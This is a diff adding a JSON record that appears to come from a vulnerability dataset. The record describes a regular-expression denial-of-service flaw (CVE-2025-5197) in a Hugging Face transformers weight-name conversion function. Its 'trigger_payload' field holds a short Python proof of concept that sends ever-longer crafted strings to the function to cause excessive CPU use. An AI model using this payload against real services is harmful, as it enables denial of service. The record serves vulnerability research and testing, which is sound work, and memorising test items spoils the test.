@@ -1,0 +1,15 @@
+{
+  "file_id": "91_transformers_huntr_3f8b3fd0-166b-46e7-b60f-60dd9d2678bf",
+  "numeric_id": "91",
+  "library_hint": "transformers",
+  "source": "huntr",
+  "title": "Regular expression catastrophic backtracking in convert_tf_weight_name_to_pt_weight_name function due to inefficient regex pattern",
+  "cve": "CVE-2025-5197",
+  "cwe": "CWE-1333: Inefficient Regular Expression Complexity",
+  "library": "transformers",
+  "affected_version": "< 4.53.0",
+  "vulnerable_function": "convert_tf_weight_name_to_pt_weight_name",
+  "triggerability": "indirect",
+  "trigger_payload": "from transformers.modeling_tf_pytorch_utils import convert_tf_weight_name_to_pt_weight_name\nimport time\nfor i in range(1, 100000, 1000):\n    payload = '/' + '___' * i\n    start = time.perf_counter()\n    convert_tf_weight_name_to_pt_weight_name(payload, tf_weight_shape=[])\n    end = time.perf_counter()\n    execution_time = end - start\n    print(f'Payload length {i}, execution time: {execution_time:.4f} seconds')",
+  "oracle": "Non-linear increase in execution time with input length, leading to excessive CPU consumption"
+}
